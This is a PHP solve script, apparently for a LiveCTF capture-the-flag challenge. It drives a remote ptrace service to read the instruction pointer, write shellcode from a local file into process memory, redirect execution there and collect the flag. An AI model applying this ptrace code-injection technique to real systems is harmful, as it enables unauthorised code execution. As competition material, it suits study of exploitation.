<?php
$env = getenv("HOST");
define("HOST", $env ? $env : "localhost");
define("PORT", 31337);

function expect_check(string $left, string $right)
{
	if($left !== $right) {
		fprintf(STDERR, "Wanted: %s\n", $left);
		fprintf(STDERR, "Got:    %s\n", $right);
		throw new Exception("Unexpected data");
	}
}

function expect($fp, string $str)
{
	$data = fread($fp, strlen($str));
	expect_check($str, $data);
}

function expectLine($fp, string $line)
{
	$data = fgets($fp);
	expect_check("$line\n", $data);
}

function line($fp) : string
{
	$line = fgets($fp);

	if("\n" !== substr($line, -1))
		throw new Exception("fgets did not return a line");

	return substr($line, 0, -1);
}


printf("[*] Opening connection\n");
$time = microtime(true);
$fp = fsockopen(HOST, PORT);

//fgets(STDIN);
printf("[+] Done in %f seconds\n", microtime(true) - $time);
printf("\n");

function ptrace($fp, int $req, int $addr, int $data)
{
	expectLine($fp, "What ptrace request do you want to send?");
	fprintf($fp, "%x\n", $req);

	expectLine($fp, "What address do you want?");
	fprintf($fp, "%x\n", $addr);

	expectLine($fp, "What do you want copied into data?");
	fprintf($fp, "%x\n", $data);

	expect($fp, "ptrace returned 0x");
	$ret = line($fp);

	expectLine($fp, "Do another (0/1)?");
	return $ret;
}

const PTRACE_PEEKTEXT = 1;
const PTRACE_PEEKUSER = 3;
const PTRACE_POKETEXT = 4;
const PTRACE_POKEUSER = 6;
const PTRACE_CONT = 7;
const PTRACE_DETACH = 17;

// Retrieve RIP
$rip = hexdec(ptrace($fp, PTRACE_PEEKUSER, 8 * 16, 0));
fwrite($fp, "1\n");

$addr = $rip & (~0xFFF);


$shellcode = file_get_contents("shellcode");
foreach(str_split($shellcode, 4) as $i => $word) {
	$word = str_pad($word, 4, "\x00");
	$int  = unpack("V", $word)[1];

	ptrace($fp, PTRACE_POKETEXT, $addr + 4 * $i, $int);
	fwrite($fp, "1\n");
}

ptrace($fp, PTRACE_POKEUSER, 8 * 16, $addr);
fwrite($fp, "1\n");

ptrace($fp, PTRACE_DETACH, 0, 0);
fwrite($fp, "0\n");

while($line = fgets($fp)) {
	echo $line;

	if(false !== strpos($line, "LiveCTF"))
		break;
}
